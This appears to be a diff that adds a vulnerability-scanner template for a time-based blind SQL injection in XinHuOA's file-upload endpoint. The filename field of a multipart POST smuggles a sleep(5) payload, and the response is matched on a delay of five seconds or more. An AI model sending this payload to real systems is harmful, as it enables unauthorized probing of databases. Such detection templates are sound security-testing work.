@@ -1,0 +1,33 @@
+id: XinHuOA-uploaw-sqlInjection
+
+info:
+  name: XinHuOA-uploaw-sqlInjection
+  author: iSee857
+  severity: high
+  description: XinHuOA-uploaw-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /index.php?a=upfile&m=uploaw|api&d=task HTTP/1.1
+        Host: 
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXo7nCpRwksqD9i
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+
+        ------WebKitFormBoundaryitXo7nCpRwksqD9i
+        Content-Disposition: form-data; name="file"; filename="a',web=(select if(123=123,sleep(5),0))-- .png"
+
+        Hello World
+        ------WebKitFormBoundaryitXo7nCpRwksqD9i--
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
